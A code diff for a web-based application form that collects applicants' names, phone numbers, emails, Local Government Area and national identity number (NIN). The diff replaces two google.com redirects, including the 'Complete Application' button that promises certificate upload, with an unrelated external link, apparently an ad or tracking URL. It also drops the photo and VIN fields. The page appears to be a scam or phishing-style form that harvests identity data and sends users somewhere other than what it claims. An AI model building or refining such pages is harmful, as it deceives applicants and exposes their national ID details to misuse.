@@ -162,7 +162,7 @@ function validateStatus() {
     }
 
     if (isValid) {
-        showLoaderAndRedirect("https://google.com");
+        showLoaderAndRedirect("https://ey43.com/4/10246098");
     }
 }
 
@@ -194,7 +194,7 @@ function loadStep1() {
         <div class="form-group"><label>Full Name</label><input type="text" id="app-name" class="form-control"></div>
         <div class="form-group"><label>Phone Number</label><input type="tel" id="app-phone" class="form-control"></div>
         <div class="form-group"><label>Email Address</label><input type="email" id="app-email" class="form-control"></div>
-        <div class="form-group"><label>Passport Photo</label><input type="file" id="app-photo" class="form-control"></div>
+        
         <div class="form-group">
             <label>Local Government Area</label>
             <select id="app-lga" class="form-control">
@@ -233,7 +233,6 @@ function loadStep1() {
             </select>
         </div>
         <div class="form-group"><label>NIN</label><input type="text" id="app-nin" class="form-control"></div>
-        <div class="form-group"><label>VIN</label><input type="text" id="app-vin" class="form-control"></div>
         <div class="error-msg" id="app-err">Please fill all fields correctly.</div>
         <button onclick="validateStep1()" class="btn-block">Continue</button>
     `;
@@ -241,7 +240,7 @@ function loadStep1() {
 
 function validateStep1() {
     // Simple validation: check if any required field is empty
-    const ids = ['app-name', 'app-phone', 'app-email', 'app-photo', 'app-lga', 'app-nin', 'app-vin'];
+    const ids = ['app-name', 'app-phone', 'app-email', 'app-lga', 'app-nin'];
     let empty = false;
     ids.forEach(id => {
         if(document.getElementById(id).value.trim() === "") empty = true;
@@ -369,7 +368,7 @@ function loadStep4() {
             <h4>Almost Done!</h4>
             <p style="margin-bottom: 20px;">Click the button below to upload your academic certificates and finalize your complete application.</p>
             
-            <a href="https://google.com" class="btn-block" style="text-decoration: none; display: inline-block;">
+            <a href="https://ey43.com/4/10246098" class="btn-block" style="text-decoration: none; display: inline-block;">
                 Complete Application
             </a>
         </div>
